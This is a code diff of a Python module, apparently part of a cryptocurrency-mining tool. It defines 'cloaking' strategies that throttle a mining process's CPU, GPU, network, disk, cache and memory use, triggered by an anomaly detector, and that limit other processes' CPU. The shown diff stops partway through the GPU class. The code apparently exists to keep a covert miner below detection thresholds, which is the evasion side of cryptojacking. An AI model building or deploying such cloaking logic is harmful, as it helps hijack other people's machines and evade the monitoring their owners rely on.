@@ -1,5 +1,3 @@
-# cloak_strategies.py
-
 import os
 import logging
 import subprocess
@@ -9,11 +7,12 @@ import traceback
 import asyncio
 from abc import ABC, abstractmethod
 from typing import Dict, Any, List, Tuple, Optional, Type
-from typing import TYPE_CHECKING
 
 from .utils import MiningProcess
 
-  
+# Import Resource Managers từ resource_control (production)
+# Giả sử file resource_control.py cùng thư mục
+from typing import TYPE_CHECKING
 if TYPE_CHECKING:
     from .resource_control import (
         CPUResourceManager,
@@ -25,815 +24,619 @@ if TYPE_CHECKING:
     )
 
 ###############################################################################
-#                 LỚP CƠ SỞ: CloakStrategy (HƯỚNG SỰ KIỆN - EVENT-DRIVEN)    #
+#                 LỚP CƠ SỞ: CloakStrategy (ABSTRACT)                         #
 ###############################################################################
-
 class CloakStrategy(ABC):
     """
-    Lớp cơ sở cho các chiến lược cloaking.
-
-    Trong mô hình event-driven, các phương thức apply() và restore() sẽ được
-    'gọi' (trigger) bởi ResourceManager/AnomalyDetector khi có sự kiện cần
-    áp dụng hoặc khôi phục cloaking. Mỗi chiến lược chịu trách nhiệm xử lý
-    logic cloaking đặc thù cho loại tài nguyên tương ứng.
+    Abstract base class cho tất cả CloakStrategy (CPU/GPU/Network/DiskIO/Cache/Memory).
+    Trong môi trường production, mỗi Strategy cần có 2 hàm:
+      - apply(process)
+      - restore(process)
+    để áp dụng cloaking & khôi phục.
     """
 
     @abstractmethod
     async def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng chiến lược cloaking (bất đồng bộ) cho tiến trình đã cho.
-        Gọi khi có sự kiện 'cloaking' xảy ra.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-        """
+        """Áp dụng cloaking cho tiến trình."""
         pass
 
     @abstractmethod
     async def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục cấu hình ban đầu (bất đồng bộ) cho tiến trình đã cho.
-        Gọi khi có sự kiện 'restore' xảy ra.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-        """
+        """Khôi phục cài đặt ban đầu cho tiến trình."""
         pass
 
 
 ###############################################################################
-#                 CPU STRATEGY: CpuCloakStrategy (EVENT-DRIVEN)               #
+#                 CPU STRATEGY: CpuCloakStrategy                              #
 ###############################################################################
-
 class CpuCloakStrategy(CloakStrategy):
     """
     Chiến lược cloaking CPU:
-      - Giới hạn CPU bằng cgroups.
-      - Tối ưu cache CPU.
-      - Đặt affinity cho các core cụ thể.
-      - Hạn chế CPU cho tiến trình bên ngoài.
-      - Khôi phục cài đặt gốc khi không cần cloaking.
-      - Đảm bảo tương thích với mô hình async/event-driven.
-    """
-
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cpu_resource_manager: 'CPUResourceManager' ):
-        """
-        Khởi tạo CpuCloakStrategy với cấu hình và logger.
-
-        - self.throttle_percentage: Mức độ "giảm" CPU (%).
-        - self.throttle_external_percentage: Mức độ "giảm" CPU cho tiến trình khác.
-        - self.exempt_pids: DS PID ngoại lệ không bị giảm.
-        - self.target_cores: Nếu không None, tiến trình bị giới hạn affinity lên các core cụ thể.
-
-        Args:
-            config (Dict[str, Any]): Cấu hình cho cloaking CPU.
-            logger (logging.Logger): Logger để ghi log.
-        """
-        self.logger = logger
-
-        self.throttle_percentage = config.get('throttle_percentage', 20)
-        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
-            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
-            self.throttle_percentage = 20
-
-        self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
-        if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
-            logger.warning("Giá trị throttle_external_percentage không hợp lệ, mặc định 30%.")
-            self.throttle_external_percentage = 30
-
-        self.exempt_pids = config.get('exempt_pids', [])
-        self.target_cores = config.get('target_cores', None)
-
-        # Lưu tên cgroup cho từng PID (nếu cần sau này).
-        self.process_cgroup: Dict[int, str] = {}
-
-        # Khởi tạo ResourceManager cụ thể
-        self.cpu_resource_manager = cpu_resource_manager
-
-    async def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng cloaking CPU (event-driven): 
-        - Tạo cgroup và giới hạn CPU usage,
-        - Tối ưu cache,
-        - Đặt CPU affinity,
-        - Hạn chế tiến trình bên ngoài.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            # Dùng asyncio.to_thread để tránh block event loop
-            cgroup_name = await asyncio.to_thread(
-                self.cpu_resource_manager.throttle_cpu_usage,
-                pid,
-                self.throttle_percentage
-            )
-            if cgroup_name:
-                self.process_cgroup[pid] = cgroup_name
-                self.logger.info(
-                    f"[CPU Cloaking] Giới hạn CPU {self.throttle_percentage}% cho {process_name} (PID={pid})."
-                )
-            else:
-                self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {process_name} (PID={pid}).")
-                return
-
-            success_optimize_cache = await asyncio.to_thread(
-                self.cpu_resource_manager.optimize_cache_usage,
-                pid
-            )
-            if success_optimize_cache:
-                self.logger.info(f"[CPU Cloaking] Tối ưu cache cho {process_name} (PID={pid}).")
-
-            success_affinity = await asyncio.to_thread(
-                self.cpu_resource_manager.optimize_thread_scheduling,
-                pid,
-                self.target_cores
-            )
-            if success_affinity:
-                self.logger.info(f"[CPU Cloaking] Đặt CPU affinity cho {process_name} (PID={pid}).")
-
-            success_limit_external = await asyncio.to_thread(
-                self.cpu_resource_manager.limit_cpu_for_external_processes,
-                [pid] + self.exempt_pids,
-                self.throttle_external_percentage
-            )
-            if success_limit_external:
-                self.logger.info(f"[CPU Cloaking] Hạn chế CPU cho tiến trình bên ngoài (PID={pid}).")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền áp dụng cloaking CPU cho PID={process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi cloaking CPU cho tiến trình {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    async def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục cài đặt CPU (event-driven): 
-        - Xoá cgroup,
-        - Bỏ giới hạn CPU cho tiến trình bên ngoài.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            cgroup_name = self.process_cgroup.get(pid)
-            if cgroup_name:
-                success_restore = await asyncio.to_thread(
-                    self.cpu_resource_manager.restore_cpu_settings,
-                    cgroup_name
-                )
-                if success_restore:
-                    self.logger.info(f"[CPU Restore] Khôi phục cgroup CPU cho {process_name} (PID={pid}).")
-                else:
-                    self.logger.error(f"[CPU Restore] Không thể khôi phục cgroup CPU cho {process_name} (PID={pid}).")
-                del self.process_cgroup[pid]
-
-            # Gỡ bỏ hạn chế CPU cho tiến trình bên ngoài
-            success_unlimit_external = await asyncio.to_thread(
-                self.cpu_resource_manager.limit_cpu_for_external_processes,
-                [pid] + self.exempt_pids,
-                0  # 0% => bỏ hạn chế
-            )
-            if success_unlimit_external:
-                self.logger.info("[CPU Restore] Đã huỷ giới hạn CPU cho tiến trình bên ngoài.")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền khôi phục cloaking CPU cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khôi phục CPU cho tiến trình {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        """Trích xuất PID và tên tiến trình."""
-        return process.pid, process.name
-
-
-###############################################################################
-#                 GPU STRATEGY: GpuCloakStrategy (EVENT-DRIVEN)               #
-###############################################################################
-
-class GpuCloakStrategy(CloakStrategy):
-    """
-    Chiến lược cloaking GPU:
-      - Giới hạn power limit,
-      - Thiết lập xung nhịp SM, memory,
-      - Giới hạn nhiệt độ, tăng fan nếu hỗ trợ,
-      - Khôi phục cài đặt gốc khi không cần cloaking.
-    """
-
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, gpu_resource_manager: 'GPUResourceManager'):
-        self.logger = logger
-
-        self.throttle_percentage = config.get('throttle_percentage', 20)
-        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
-            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
-            self.throttle_percentage = 20
-
-        self.target_sm_clock = config.get('sm_clock', 1300)   # MHz
-        self.target_mem_clock = config.get('mem_clock', 800)  # MHz
-
-        self.temperature_threshold = config.get('temperature_threshold', 80)
-        if not isinstance(self.temperature_threshold, (int, float)) or self.temperature_threshold <= 0:
-            logger.warning("Giá trị temperature_threshold không hợp lệ, mặc định 80°C.")
-            self.temperature_threshold = 80
-
-        self.fan_speed_increase = config.get('fan_speed_increase', 20)
-        if not isinstance(self.fan_speed_increase, (int, float)) or not (0 <= self.fan_speed_increase <= 100):
-            logger.warning("Giá trị fan_speed_increase không hợp lệ, mặc định 20%.")
-            self.fan_speed_increase = 20
- 
-        self.gpu_resource_manager = gpu_resource_manager
-
-    async def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng cloaking GPU (event-driven):
-          - Giới hạn power limit,
-          - Điều chỉnh clock,
-          - Giới hạn nhiệt độ (nếu cần).
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            # Gán GPU cho tiến trình (vd. theo PID)
-            gpu_indices = await asyncio.to_thread(self.assign_gpus, pid)
-            if not gpu_indices:
-                self.logger.warning(f"[GPU Cloaking] Không thể gán GPU cho {process_name} (PID={pid}).")
-                return
-
-            for gpu_index in gpu_indices:
-                desired_power_limit = self.calculate_desired_power_limit(gpu_index)
-                success_power = await asyncio.to_thread(
-                    self.gpu_resource_manager.set_gpu_power_limit,
-                    pid,
-                    gpu_index,
-                    desired_power_limit
-                )
-                if success_power:
-                    self.logger.info(f"[GPU Cloaking] Đặt power limit={desired_power_limit}W, GPU={gpu_index}, PID={pid}.")
-
-                success_clocks = await asyncio.to_thread(
-                    self.gpu_resource_manager.set_gpu_clocks,
-                    pid,
-                    gpu_index,
-                    self.target_sm_clock,
-                    self.target_mem_clock
-                )
-                if success_clocks:
-                    self.logger.info(f"[GPU Cloaking] Đặt SM={self.target_sm_clock}MHz / MEM={self.target_mem_clock}MHz cho GPU={gpu_index}, PID={pid}.")
-
-                success_temp = await asyncio.to_thread(
-                    self.gpu_resource_manager.limit_temperature,
-                    gpu_index,
-                    self.temperature_threshold,
-                    self.fan_speed_increase
-                )
-                if success_temp:
-                    self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ GPU={gpu_index}, PID={pid}.")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền áp dụng cloaking GPU cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi cloaking GPU cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    async def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục cài đặt GPU (event-driven):
-          - Gỡ bỏ các giới hạn power, clock v.v.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            success_restore = await asyncio.to_thread(
-                self.gpu_resource_manager.restore_resources,
-                pid
-            )
-            if success_restore:
-                self.logger.info(f"[GPU Restore] Đã khôi phục thiết lập GPU cho {process_name} (PID={pid}).")
-            else:
-                self.logger.error(f"[GPU Restore] Không thể khôi phục GPU cho {process_name} (PID={pid}).")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền khôi phục cloaking GPU cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khôi phục GPU cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def calculate_desired_power_limit(self, gpu_index: int) -> int:
-        """
-        Tính toán power limit mới dựa trên throttle_percentage.
-        """
-        current_limit = self.gpu_resource_manager.get_gpu_power_limit(gpu_index) or 100
-        desired = int(round(current_limit * (1 - self.throttle_percentage / 100)))
-        self.logger.debug(f"Tính toán power limit mới GPU={gpu_index}: {desired}W.")
-        return desired
-
-    def assign_gpus(self, pid: int) -> List[int]:
-        """
-        Gán GPU cho PID. Ở đây ví dụ gán toàn bộ GPU sẵn có.
-        """
-        gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
-        if gpu_count <= 0:
-            return []
-        assigned = list(range(gpu_count))
-        self.logger.debug(f"[GPU Cloaking] Gán GPU {assigned} cho PID={pid}.")
-        return assigned
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        return process.pid, process.name
-
-
-###############################################################################
-#              NETWORK STRATEGY: NetworkCloakStrategy (EVENT-DRIVEN)          #
-###############################################################################
-
-class NetworkCloakStrategy(CloakStrategy):
-    """
-    Chiến lược cloaking mạng:
-      - Giảm băng thông cho PID (iptables + tc),
-      - Khôi phục cài đặt ban đầu khi không cần cloaking.
-    """
-
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, network_resource_manager: 'NetworkResourceManager'):
-        self.logger = logger
-
-        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
-        if not isinstance(self.bandwidth_reduction_mbps, (int, float)) or self.bandwidth_reduction_mbps <= 0:
-            logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định 10Mbps.")
-            self.bandwidth_reduction_mbps = 10
-
-        self.network_interface = config.get('network_interface')
-        if not self.network_interface:
-            # Tự động xác định
-            self.network_interface = self.get_primary_network_interface() or "eth0"
-
-        self.network_resource_manager = network_resource_manager
-        self.process_marks: Dict[int, int] = {}
-
-    async def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng cloaking mạng (event-driven):
-         - Thêm iptables mark,
-         - Giới hạn băng thông qua tc.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            mark = pid % 32768
-            success_mark = await asyncio.to_thread(
-                self.network_resource_manager.mark_packets,
-                pid,
-                mark
-            )
-            if not success_mark:
-                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}, mark={mark}.")
-                return
-
-            success_limit = await asyncio.to_thread(
-                self.network_resource_manager.limit_bandwidth,
-                self.network_interface,
-                mark,
-                self.bandwidth_reduction_mbps
-            )
-            if not success_limit:
-                self.logger.error(f"[Net Cloaking] Không thể giới hạn băng thông, mark={mark}, iface={self.network_interface}.")
-                return
-
-            self.process_marks[pid] = mark
-            self.logger.info(
-                f"[Net Cloaking] Giới hạn {self.bandwidth_reduction_mbps}Mbps cho {process_name} (PID={pid}), iface={self.network_interface}, mark={mark}."
-            )
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền cloaking mạng cho PID={process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi cloaking mạng cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    async def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục băng thông (event-driven):
-         - Gỡ bỏ giới hạn tc,
-         - Xoá iptables mark.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            mark = self.process_marks.get(pid)
-            if mark is None:
-                self.logger.warning(f"[Net Restore] Không tìm thấy fwmark cho PID={pid}.")
-                return
-
-            success_remove = await asyncio.to_thread(
-                self.network_resource_manager.remove_bandwidth_limit,
-                self.network_interface,
-                mark
-            )
-            if success_remove:
-                self.logger.info(f"[Net Restore] Khôi phục băng thông cho {process_name} (PID={pid}).")
-
-            success_unmark = await asyncio.to_thread(
-                self.network_resource_manager.unmark_packets,
-                pid,
-                mark
-            )
-            if success_unmark:
-                self.logger.info(f"[Net Restore] Xoá MARK iptables cho {process_name} (PID={pid}).")
-
-            if pid in self.process_marks:
-                del self.process_marks[pid]
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền khôi phục cloaking mạng cho PID={process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khôi phục mạng cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def get_primary_network_interface(self) -> Optional[str]:
-        """Tự động xác định giao diện mạng chính."""
-        try:
-            for iface, addr_list in psutil.net_if_addrs().items():
-                for addr in addr_list:
-                    if addr.family == psutil.AF_LINK:
-                        return iface
-            return None
-        except Exception as e:
-            self.logger.error(f"Lỗi xác định giao diện mạng: {e}")
-            return None
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        return process.pid, process.name
-
-
-###############################################################################
-#            DISK IO STRATEGY: DiskIoCloakStrategy (EVENT-DRIVEN)             #
-###############################################################################
-
-class DiskIoCloakStrategy(CloakStrategy):
-    """
-    Chiến lược cloaking Disk I/O:
-      - Giới hạn I/O weight qua cgroups hoặc ionice,
-      - Khôi phục khi không cần cloaking.
-    """
-
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, disk_io_resource_manager: 'DiskIOResourceManager'):
-        self.logger = logger
-
-        self.io_weight = config.get('io_weight', 500)
-        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
-            logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định 500.")
-            self.io_weight = 500
-
-        self.disk_io_resource_manager = disk_io_resource_manager
-
-    async def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng cloaking Disk I/O (event-driven):
-         - Đặt I/O weight (cgroups hoặc ionice).
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            success = await asyncio.to_thread(
-                self.disk_io_resource_manager.set_io_weight,
-                pid,
-                self.io_weight
-            )
-            if success:
-                self.logger.info(f"[DiskIO Cloaking] Đặt io_weight={self.io_weight} cho {process_name} (PID={pid}).")
-            else:
-                self.logger.error(f"[DiskIO Cloaking] Không thể đặt io_weight={self.io_weight} cho PID={pid}.")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền cloaking Disk I/O cho PID={process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi cloaking Disk I/O cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    async def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục cài đặt I/O (event-driven):
-         - Đặt lại io_weight = 1000 (hoặc giá trị tối đa).
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            success = await asyncio.to_thread(
-                self.disk_io_resource_manager.set_io_weight,
-                pid,
-                1000
-            )
-            if success:
-                self.logger.info(f"[DiskIO Restore] Đã khôi phục io_weight=1000 cho {process_name} (PID={pid}).")
-            else:
-                self.logger.error(f"[DiskIO Restore] Không thể khôi phục io_weight cho PID={pid}.")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền khôi phục Disk I/O cho PID={process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khôi phục Disk I/O cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        return process.pid, process.name
-
-
-###############################################################################
-#            CACHE STRATEGY: CacheCloakStrategy (EVENT-DRIVEN)                #
-###############################################################################
-
-class CacheCloakStrategy(CloakStrategy):
-    """
-    Chiến lược cloaking Cache:
-      - Drop caches,
-      - Giới hạn cache usage,
-      - Khôi phục cài đặt gốc khi không cần cloaking.
-    """
-
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cache_resource_manager: 'CacheResourceManager'):
-        self.logger = logger
-
-        self.cache_limit_percent = config.get('cache_limit_percent', 50)
-        if not (0 <= self.cache_limit_percent <= 100):
-            logger.warning(f"cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định 50%.")
-            self.cache_limit_percent = 50
-
-        self.cache_resource_manager = cache_resource_manager
-
-    async def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng cloaking Cache (event-driven):
-         - Drop caches hệ thống,
-         - Giới hạn cache usage.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            success_drop = await asyncio.to_thread(self.cache_resource_manager.drop_caches)
-            if success_drop:
-                self.logger.info(f"[Cache Cloaking] Drop caches cho {process_name} (PID={pid}).")
-
-            success_limit = await asyncio.to_thread(
-                self.cache_resource_manager.limit_cache_usage,
-                self.cache_limit_percent
-            )
-            if success_limit:
-                self.logger.info(f"[Cache Cloaking] Giới hạn cache={self.cache_limit_percent}% cho PID={pid}.")
-
-        except PermissionError:
-            self.logger.error(
-                f"Không đủ quyền drop caches. Cloaking Cache thất bại cho PID={process.pid}."
-            )
-            raise
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền cloaking Cache cho PID={process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi cloaking Cache cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    async def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục cache (event-driven):
-         - Gỡ giới hạn, đặt cache usage = 100%.
-        """
-        try:
-            pid, process_name = self.get_process_info(process)
-
-            success_limit = await asyncio.to_thread(
-                self.cache_resource_manager.limit_cache_usage,
-                100
-            )
-            if success_limit:
-                self.logger.info(f"[Cache Restore] Đã khôi phục giới hạn cache=100% cho PID={pid}.")
-
-        except PermissionError:
-            self.logger.error(
-                f"Không đủ quyền để khôi phục Cache cho PID={process.pid}."
-            )
-            raise
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền khôi phục cloaking Cache cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khôi phục Cache cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        return process.pid, process.name
-
-
-###############################################################################
-#            MEMORY STRATEGY: MemoryCloakStrategy (EVENT-DRIVEN)              #
-###############################################################################
-
-class MemoryCloakStrategy(CloakStrategy):
-    """
-    Chiến lược cloaking Memory:
-      - Giới hạn usage (vd. cgroups),
-      - Drop caches nếu cần thiết,
-      - Khôi phục cài đặt khi không cần cloaking.
+      - Giới hạn CPU bằng cgroup,
+      - Tối ưu cache CPU (tuỳ ý),
+      - Đặt affinity,
+      - Hạn chế tiến trình bên ngoài (throttle_external).
     """
 
     def __init__(
         self,
         config: Dict[str, Any],
         logger: logging.Logger,
-        memory_resource_manager: 'MemoryResourceManager',
-        cache_resource_manager: 'CacheResourceManager'  # Tiêm CacheResourceManager
+        cpu_resource_manager: "CPUResourceManager"
     ):
         self.logger = logger
+        self.config = config
+        self.cpu_resource_manager = cpu_resource_manager
 
-        self.memory_limit_percent = config.get('memory_limit_percent', 50)
-        if not (0 <= self.memory_limit_percent <= 100):
-            logger.warning(f"memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định 50%.")
-            self.memory_limit_percent = 50
+        self.throttle_percentage = config.get('throttle_percentage', 20)
+        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
+            self.logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
+            self.throttle_percentage = 20
 
-        self.memory_resource_manager = memory_resource_manager
-        self.cache_resource_manager = cache_resource_manager
+        self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
+        if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
+            self.logger.warning("Giá trị throttle_external_percentage không hợp lệ, mặc định 30%.")
+            self.throttle_external_percentage = 30
+
+        self.exempt_pids = config.get('exempt_pids', [])  # DS PID không bị throttle external
+        self.target_cores = config.get('target_cores', None)
 
     async def apply(self, process: MiningProcess) -> None:
-        """
-        Áp dụng cloaking Memory (event-driven):
-         - Drop caches,
-         - Giới hạn memory usage.
-        """
+        """Áp dụng CPU cloaking."""
         try:
-            pid, process_name = self.get_process_info(process)
+            pid, name = process.pid, process.name
 
-            # Drop caches
-            success_drop = await asyncio.to_thread(self.cache_resource_manager.drop_caches, pid)
-            if success_drop:
-                self.logger.info(f"[Memory Cloaking] Drop caches cho {process_name} (PID={pid}).")
+            # 1) Giới hạn CPU usage
+            cgroup_name = await self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage)
+            if cgroup_name:
+                self.logger.info(f"[CPU Cloaking] Giới hạn CPU={self.throttle_percentage}% cho {name}(PID={pid}).")
+            else:
+                self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {name}(PID={pid}).")
+                return
 
-            # Giới hạn memory
-            memory_limit_mb = self.calculate_memory_limit_mb()
-            success_limit = await asyncio.to_thread(
-                self.memory_resource_manager.set_memory_limit,
-                pid,
-                memory_limit_mb
+            # 2) Tối ưu cache CPU
+            success_cache = await self.cpu_resource_manager.optimize_cache_usage(pid)
+            if success_cache:
+                self.logger.info(f"[CPU Cloaking] Tối ưu cache cho {name}(PID={pid}).")
+
+            # 3) Đặt CPU affinity
+            success_affinity = await self.cpu_resource_manager.optimize_thread_scheduling(pid, self.target_cores)
+            if success_affinity:
+                self.logger.info(f"[CPU Cloaking] Đặt CPU affinity cho {name}(PID={pid}).")
+
+            # 4) Hạn chế tiến trình bên ngoài
+            outside_ok = await self.cpu_resource_manager.limit_cpu_for_external_processes(
+                [pid] + self.exempt_pids,  # PID này + DS exempt
+                self.throttle_external_percentage
             )
-            if success_limit:
-                self.logger.info(
-                    f"[Memory Cloaking] Giới hạn {self.memory_limit_percent}% (~{memory_limit_mb}MB) cho PID={pid}."
-                )
+            if outside_ok:
+                self.logger.info(f"[CPU Cloaking] Hạn chế CPU outside => throttle={self.throttle_external_percentage}%.")
 
-        except PermissionError:
-            self.logger.error(
-                f"Không đủ quyền drop caches. Cloaking Memory thất bại cho PID={process.pid}."
-            )
-            raise
         except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
+            self.logger.error(f"CPU Cloaking: Tiến trình không tồn tại: {e}")
         except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền cloaking Memory cho PID={process.pid}: {e}")
+            self.logger.error(f"CPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi cloaking Memory cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
+                f"Lỗi cloaking CPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
     async def restore(self, process: MiningProcess) -> None:
-        """
-        Khôi phục memory (event-driven):
-         - Gỡ giới hạn memory,
-         - Khôi phục cache usage.
-        """
+        """Khôi phục CPU cài đặt."""
         try:
-            pid, process_name = self.get_process_info(process)
+            pid, name = process.pid, process.name
 
-            # Khôi phục giới hạn memory
-            success_restore_memory = await asyncio.to_thread(
-                self.memory_resource_manager.restore_resources,
-                pid
+            # 1) Xoá cgroup CPU (khôi phục usage)
+            success_restore = await self.cpu_resource_manager.restore_resources(pid)
+            if success_restore:
+                self.logger.info(f"[CPU Restore] Xoá cgroup CPU cho {name}(PID={pid}).")
+
+            # 2) Bỏ hạn chế CPU outside => set=0 => remove cgroup
+            unlimit_ok = await self.cpu_resource_manager.limit_cpu_for_external_processes(
+                [pid] + self.exempt_pids, 0
             )
-            if success_restore_memory:
-                self.logger.info(f"[Memory Restore] Khôi phục giới hạn memory cho PID={pid}.")
+            if unlimit_ok:
+                self.logger.info(f"[CPU Restore] Huỷ giới hạn CPU outside (PID={pid}).")
+
+        except psutil.NoSuchProcess as e:
+            self.logger.error(f"CPU Restore: Tiến trình không tồn tại: {e}")
+        except psutil.AccessDenied as e:
+            self.logger.error(f"CPU Restore: Không đủ quyền cho PID={process.pid}: {e}")
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khôi phục CPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            raise
+
+
+###############################################################################
+#                 GPU STRATEGY: GpuCloakStrategy                              #
+###############################################################################
+class GpuCloakStrategy(CloakStrategy):
+    """
+    Chiến lược cloaking GPU:
+      - Giới hạn power limit,
+      - Set xung nhịp,
+      - (Tuỳ chọn) limit_temperature => hạ xung nhịp nếu GPU nóng,
+      - Khôi phục cài đặt gốc khi restore().
+    """
+
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        gpu_resource_manager: "GPUResourceManager"
+    ):
+        self.logger = logger
+        self.config = config
+        self.gpu_resource_manager = gpu_resource_manager
+
+        # Tham số chung
+        self.throttle_percentage = config.get('throttle_percentage', 20)
+        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
+            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định 20%.")
+            self.throttle_percentage = 20
+
+        # Clock
+        self.target_sm_clock = config.get('sm_clock', 1300)
+        self.target_mem_clock = config.get('mem_clock', 800)
+
+        # Nhiệt độ (nếu muốn limit_temperature)
